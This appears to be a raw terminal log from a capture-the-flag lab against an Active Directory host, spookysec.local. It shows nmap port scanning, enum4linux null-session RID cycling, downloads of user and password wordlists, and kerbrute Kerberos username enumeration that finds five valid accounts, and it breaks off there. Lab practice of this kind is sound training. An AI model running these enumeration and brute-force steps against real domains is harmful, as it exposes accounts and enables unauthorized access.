
# nmap

but ansewe was 11
```
root@kali:~# nmap -sV -sC -p- -T5 spookysec.local
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-17 12:17 UTC
Nmap scan report for spookysec.local (10.10.3.95)
Host is up (0.00037s latency).
Not shown: 65509 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-17 12:22:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2020-07-17T12:25:10+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2020-04-03T18:40:09
|_Not valid after:  2020-10-03T18:40:09
|_ssl-date: 2020-07-17T12:25:25+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=7/17%Time=5F119823%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
MAC Address: 02:AF:A9:1E:73:E6 (Unknown)
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: ATTACKTIVEDIREC, NetBIOS user: <unknown>, NetBIOS MAC: 02:af:a9:1e:73:e6 (unknown)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-07-17T12:25:10
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 574.96 seconds
```

```
root@kali:~# enum4linux -A 10.10.245.235
Unknown option: A
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jul 14 13:36:41 2020

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.10.245.235
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =====================================================
|    Enumerating Workgroup/Domain on 10.10.245.235    |
 =====================================================
[+] Got domain/workgroup name: THM-AD

 =============================================
|    Nbtstat Information for 10.10.245.235    |
 =============================================
Looking up status of 10.10.245.235
        ATTACKTIVEDIREC <00> -         B <ACTIVE>  Workstation Service
        THM-AD          <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        THM-AD          <1c> - <GROUP> B <ACTIVE>  Domain Controllers
        ATTACKTIVEDIREC <20> -         B <ACTIVE>  File Server Service
        THM-AD          <1b> -         B <ACTIVE>  Domain Master Browser

        MAC Address = 02-40-76-09-AB-5A

 ======================================
|    Session Check on 10.10.245.235    |
 ======================================
[+] Server 10.10.245.235 allows sessions using username '', password ''

 ============================================
|    Getting domain SID for 10.10.245.235    |
 ============================================
Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963
[+] Host is part of a domain (not a workgroup)

 =======================================
|    OS information on 10.10.245.235    |
 =======================================
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.245.235 from smbclient:
[+] Got OS info for 10.10.245.235 from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ==============================
|    Users on 10.10.245.235    |
 ==============================
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ==========================================
|    Share Enumeration on 10.10.245.235    |
 ==========================================

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.245.235

 =====================================================
|    Password Policy Information for 10.10.245.235    |
 =====================================================
[E] Unexpected error from polenum:


[+] Attaching to 10.10.245.235 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.245.235)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: Missing required parameter 'digestmod'.


[E] Failed to get password policy with rpcclient


 ===============================
|    Groups on 10.10.245.235    |
 ===============================

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ========================================================================
|    Users on 10.10.245.235 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================
[I] Found new SID: S-1-5-21-3591857110-2884097990-301047963
[I] Found new SID: S-1-5-21-3532885019-1334016158-1514108833
[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''
S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-502 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-505 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-506 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-507 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-508 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-509 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-510 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-511 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-512 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)
S-1-5-21-3532885019-1334016158-1514108833-514 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-515 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-516 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-517 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-518 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-519 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-520 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-521 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-522 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-523 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-524 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-525 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-526 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-527 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-528 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-529 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-530 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-531 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-532 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-533 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-534 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-535 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-536 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-537 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-538 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-539 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-540 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-541 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-542 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-543 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-544 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-545 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-546 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-547 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-548 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-549 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-550 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1000 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1001 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1002 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1003 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1004 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1005 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1006 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1007 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1008 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1009 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1010 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1011 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1012 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1013 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1014 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1015 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1016 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1017 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1018 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1019 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1020 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1021 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1022 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1023 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1024 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1025 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1026 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1027 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1028 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1029 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1030 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1031 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1032 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1033 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1034 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1035 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1036 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1037 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1038 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1039 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1040 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1041 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1042 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1043 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1044 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1045 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1046 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1047 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1048 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1049 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-503 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-504 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-505 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-506 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-507 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-508 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-509 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-510 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-511 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-523 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-524 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-528 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-529 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-530 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-531 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-532 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-533 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-534 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-535 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-536 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-537 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-538 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-539 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-540 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-541 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-542 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-543 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-544 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-545 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-546 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-547 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-548 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-549 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-550 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)
S-1-5-21-3591857110-2884097990-301047963-1001 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1002 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1003 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1004 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1005 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1006 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1007 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1008 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1009 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1010 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1011 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1012 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1013 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1014 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1015 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1016 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1017 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1018 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1019 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1020 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1021 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1022 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1023 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1024 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1025 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1026 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1027 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1028 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1029 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1030 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1031 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1032 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1033 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1034 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1035 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1036 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1037 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1038 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1039 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1040 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1041 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1042 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1043 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1044 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1045 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1046 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1047 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1048 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1049 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1050 *unknown*\*unknown* (8)

 ==============================================
|    Getting printer info for 10.10.245.235    |
 ==============================================
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Tue Jul 14 13:36:53 2020

root@kali:~#
```

# kerbrute
```
root@kali:~# wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
--2020-07-17 12:23:55--  https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 199.232.24.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|199.232.24.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 744407 (727K) [text/plain]
Saving to: ‘userlist.txt’

userlist.txt        100%[===================>] 726.96K  --.-KB/s    in 0.02s

2020-07-17 12:23:55 (31.8 MB/s) - ‘userlist.txt’ saved [744407/744407]

root@kali:~# wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
--2020-07-17 12:24:06--  https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 199.232.24.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|199.232.24.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 569236 (556K) [text/plain]
Saving to: ‘passwordlist.txt’

passwordlist.txt    100%[===================>] 555.89K  --.-KB/s    in 0.02s

2020-07-17 12:24:07 (28.6 MB/s) - ‘passwordlist.txt’ saved [569236/569236]

root@kali:~# kerbryte
-bash: kerbryte: command not found
root@kali:~# kerbrute
-bash: kerbrute: command not found
root@kali:~# wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
--2020-07-17 12:25:16--  https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
Resolving github.com (github.com)... 140.82.118.3
Connecting to github.com (github.com)|140.82.118.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://github-production-release-asset-2e65be.s3.amazonaws.com/168977645/e8ae4080-1eb1-11ea-8fea-0ea168fa4c79?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20200717%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20200717T122516Z&X-Amz-Expires=300&X-Amz-Signature=955e70838e15bafc7e154b3e570019a92d695845a4c03421ada72170d8f13c6f&X-Amz-SignedHeaders=host&actor_id=0&repo_id=168977645&response-content-disposition=attachment%3B%20filename%3Dkerbrute_linux_amd64&response-content-type=application%2Foctet-stream [following]
--2020-07-17 12:25:16--  https://github-production-release-asset-2e65be.s3.amazonaws.com/168977645/e8ae4080-1eb1-11ea-8fea-0ea168fa4c79?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20200717%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20200717T122516Z&X-Amz-Expires=300&X-Amz-Signature=955e70838e15bafc7e154b3e570019a92d695845a4c03421ada72170d8f13c6f&X-Amz-SignedHeaders=host&actor_id=0&repo_id=168977645&response-content-disposition=attachment%3B%20filename%3Dkerbrute_linux_amd64&response-content-type=application%2Foctet-stream
Resolving github-production-release-asset-2e65be.s3.amazonaws.com (github-production-release-asset-2e65be.s3.amazonaws.com)... 52.217.32.236
Connecting to github-production-release-asset-2e65be.s3.amazonaws.com (github-production-release-asset-2e65be.s3.amazonaws.com)|52.217.32.236|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8286607 (7.9M) [application/octet-stream]
Saving to: ‘kerbrute_linux_amd64’

kerbrute_linux_amd6 100%[===================>]   7.90M  6.73MB/s    in 1.2s

2020-07-17 12:25:18 (6.73 MB/s) - ‘kerbrute_linux_amd64’ saved [8286607/8286607]
root@kali:~/Downloads# chmod +x kerbrute_linux_amd64
root@kali:~/Downloads# ./kerbrute_linux_amd64

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 07/14/20 - Ronnie Flathers @ropnop

This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

Usage:
  kerbrute [command]

Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit

Flags:
      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
      --delay int       Delay in millisecond between each attempt. Will always use single thread if set
  -d, --domain string   The full domain to use (e.g. contoso.com)
  -h, --help            help for kerbrute
  -o, --output string   File to write logs to. Optional.
      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int     Threads to use (default 10)
  -v, --verbose         Log failures and errors

Use "kerbrute [command] --help" for more information about a command.
```

```
root@kali:~/Downloads# echo 10.10.245.235 spookysec.local >>/etc/hosts
root@kali:~/Downloads# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.245.235 spookysec.local
root@kali:~/Downloads#
root@kali:~/Downloads# ./kerbrute_linux_amd64 userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 07/14/20 - Ronnie Flathers @ropnop

2020/07/14 14:02:09 >  Using KDC(s):
2020/07/14 14:02:09 >   spookysec.local:88

2020/07/14 14:02:09 >  [+] VALID USERNAME:       james@spookysec.local
2020/07/14 14:02:09 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2020/07/14 14:02:09 >  [+] VALID USERNAME:       James@spookysec.local
2020/07/14 14:02:09 >  [+] VALID USERNAME:       robin@spookysec.local
2020/07/14 14:02:09 >  [+] VALID USERNAME:       darkstar@spookysec.local
